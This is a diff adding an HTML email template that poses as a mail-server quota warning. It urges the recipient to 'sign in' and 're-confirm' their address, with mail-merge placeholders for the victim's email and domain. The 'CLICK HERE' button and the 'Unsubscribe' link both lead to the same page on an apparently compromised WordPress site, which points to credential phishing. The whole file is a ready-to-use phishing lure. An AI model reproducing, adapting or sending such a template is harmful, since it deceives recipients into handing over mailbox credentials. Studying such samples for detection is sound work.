@@ -1,0 +1,14 @@
+<HTML><HEAD>
+<META name=GENERATOR content="MSHTML 11.00.9600.19267"></HEAD>
+<BODY>
+<DIV style="FONT-SIZE: 10px; MAX-WIDTH: 550px; PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 10px; PADDING-RIGHT: 10px" align=left><EM><A href="http://bitechsolutions.org/wp-admin/re/index.php?x=x&amp;a=[[-Email-]]">Unsubscribe </A>now to stop receiving this important notification message.</EM></DIV>
+<DIV style="MAX-WIDTH: 550px; PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 10px; PADDING-RIGHT: 10px" align=left>
+<HR>
+<STRONG>Please Sign in again.</STRONG></DIV><TD style="FONT-SIZE: 80px; FONT-FAMILY: Roboto-Regular,Helvetica,Arial,sans-serif; COLOR: rgb(255,255,255); line-: 2"><SPAN style="COLOR: #f95316">
+<H1 style="MAX-WIDTH: 550px; PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 10px; PADDING-RIGHT: 10px" align=left><FONT color=#0a40f5 size=5>[[-Domain-]]&nbsp;Email Server</FONT></H1></SPAN></TD>
+<DIV style="MAX-WIDTH: 550px; PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 10px; PADDING-RIGHT: 10px" align=left>Incomming mails with 55kb will be on hold and this will lead to email bounce for <EM><FONT color=#454bba>www.[[-Domain-]]<BR></FONT></EM><STRONG><FONT color=#0c1ff3><BR></FONT></STRONG>Do please re-confirm your email&nbsp;<STRONG><EM><U><FONT color=#0a16f5>[[-Email-]]</FONT></U></EM></STRONG> to upgrade mail quota and enjoy your MailBox with the new upgrade.<BR><BR></DIV>
+<DIV style="MAX-WIDTH: 550px; PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 10px; PADDING-RIGHT: 10px" align=left>Please sign in to re-confirm <STRONG><FONT color=#13ec15>[[-Email-]]</FONT></STRONG> ownership.</DIV>
+<DIV style="MAX-WIDTH: 200px; PADDING-BOTTOM: 10px; TEXT-ALIGN: center; PADDING-TOP: 10px; PADDING-LEFT: 10px; PADDING-RIGHT: 10px; BACKGROUND-COLOR: #0078d7" align=left><A style="TEXT-DECORATION: none; FONT-FAMILY: Boing-Bold,Arial Black,sans-serif; COLOR: white" href="http://bitechsolutions.org/wp-admin/re/index.php?x=x&amp;a=[[-Email-]]"><U>CLICK HERE</U> To Confirm ownership and Upgrade.</A> </DIV>
+<DIV style="MAX-WIDTH: 550px; PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 10px; PADDING-RIGHT: 10px" align=left><BR><BR><BR><BR>Best Regards,<BR>[[-Domain-]] Service Team</DIV>
+<DIV style="MAX-WIDTH: 550px; PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 10px; PADDING-RIGHT: 10px" align=left><I></I>&nbsp;</DIV>
+<DIV style="MAX-WIDTH: 550px; PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 10px; PADDING-RIGHT: 10px" align=left>2019 &copy; <FONT size=2 face=Calibri>Mail Admin 2019 | All rights reserved</FONT></DIV></BODY></HTML>
